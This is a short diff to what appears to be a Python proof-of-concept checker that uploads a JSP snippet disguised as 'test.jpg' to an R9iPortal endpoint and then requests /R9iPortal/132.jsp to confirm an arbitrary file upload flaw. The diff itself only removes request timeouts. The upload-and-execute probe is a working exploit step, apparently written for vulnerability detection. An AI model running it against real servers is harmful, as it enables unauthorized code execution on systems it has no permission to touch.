@@ -47,8 +47,8 @@ class poc:
             'myFile': ('test.jpg', '<%out.print("test");%>', 'multipart/form-data')
         }
         try:
-            result = requests.post(url=url, headers=self.headers, files=data, verify=False, timeout=3, proxies=self.proxies)
-            req = requests.get("{}://{}/R9iPortal/132.jsp".format(scheme, netloc), headers=self.headers, allow_redirects=False, verify=False, timeout=3, proxies=self.proxies)
+            result = requests.post(url=url, headers=self.headers, files=data, verify=False, proxies=self.proxies)
+            req = requests.get("{}://{}/R9iPortal/132.jsp".format(scheme, netloc), headers=self.headers, allow_redirects=False, verify=False, proxies=self.proxies)
             if req.status_code == 200 and req.text.find("test") != -1:
                 target = urlparse(url)
                 self.result_text += """\n        [+]    \033[32m检测到目标站点存在任意文件上传漏洞\033[0m
